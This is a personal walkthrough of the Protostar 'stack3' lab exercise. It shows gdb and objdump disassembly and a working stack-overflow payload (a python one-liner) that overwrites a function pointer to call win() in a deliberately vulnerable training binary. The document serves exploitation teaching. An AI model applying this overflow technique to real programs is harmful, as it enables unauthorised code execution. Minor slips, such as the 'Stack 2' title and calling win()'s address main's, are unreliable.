{{ Exploit Exercises: Protostar - 0x01 - Stack 2

    [~] {{ Exercise details

        Link : https://exploit-exercises.com/protostar/stack3/

        About:
        Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

        Hints:
            → both gdb and objdump is your friend you determining where the win() function lies in memory.

    }}

    [x] {{ Intended Solution

        # Checking behavior when used as expected
        user@protostar:/opt/protostar/bin$ ./stack3
        fubar

        # Checking behavior when overflowing the buffer
        user@protostar:/opt/protostar/bin$ printf 'A%.0s' {1..100} | ./stack3
        calling function pointer, jumping to 0x41414141
        Segmentation fault

        # Loading the program into gdb and disassembling the main() function
        user@protostar:/opt/protostar/bin$ gdb stack3 -q
        Reading symbols from /opt/protostar/bin/stack3...done.
        (gdb) disassemble main
        Dump of assembler code for function main:
        0x08048438 <main+0>:    push   %ebp
        0x08048439 <main+1>:    mov    %esp,%ebp
        0x0804843b <main+3>:    and    $0xfffffff0,%esp
        0x0804843e <main+6>:    sub    $0x60,%esp
        0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
        0x08048449 <main+17>:   lea    0x1c(%esp),%eax
        0x0804844d <main+21>:   mov    %eax,(%esp)
        0x08048450 <main+24>:   call   0x8048330 <gets@plt>
        0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
        0x0804845a <main+34>:   je     0x8048477 <main+63>
        0x0804845c <main+36>:   mov    $0x8048560,%eax
        0x08048461 <main+41>:   mov    0x5c(%esp),%edx
        0x08048465 <main+45>:   mov    %edx,0x4(%esp)
        0x08048469 <main+49>:   mov    %eax,(%esp)
        0x0804846c <main+52>:   call   0x8048350 <printf@plt>
        0x08048471 <main+57>:   mov    0x5c(%esp),%eax
        0x08048475 <main+61>:   call   *%eax
        0x08048477 <main+63>:   leave
        0x08048478 <main+64>:   ret
        End of assembler dump.

        # Disassembling win() function
        (gdb) disassemble win
        Dump of assembler code for function win:
        0x08048424 <win+0>: push   %ebp
        0x08048425 <win+1>: mov    %esp,%ebp
        0x08048427 <win+3>: sub    $0x18,%esp
        0x0804842a <win+6>: movl   $0x8048540,(%esp)
        0x08048431 <win+13>:    call   0x8048360 <puts@plt>
        0x08048436 <win+18>:    leave
        0x08048437 <win+19>:    ret
        End of assembler dump.

        # From the above output it looks like main is at memory address 0x08048424. Let's also have a look at the objdump
        user@protostar:/opt/protostar/bin$ objdump -M intel -D stack3 | grep "<.*>:"
        ....
        08048424 <win>:
        08048438 <main>:
        ....

        # With this information it's time to update the payload to fill the variable 'fp' with the address of win()
        user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
        calling function pointer, jumping to 0x08048424
        code flow successfully changed

    }}

    [ ] {{ Root shell
    }}

    [~] {{ What did I learn?

        → Objdump
            → Use the -D switch to disassemble everything, and grep the output with this pattern "<.*>:" to see the name
              of all the executable sections in the program
            → Using the -M switch with the 'intel' option will output using the intel style
    }}

}}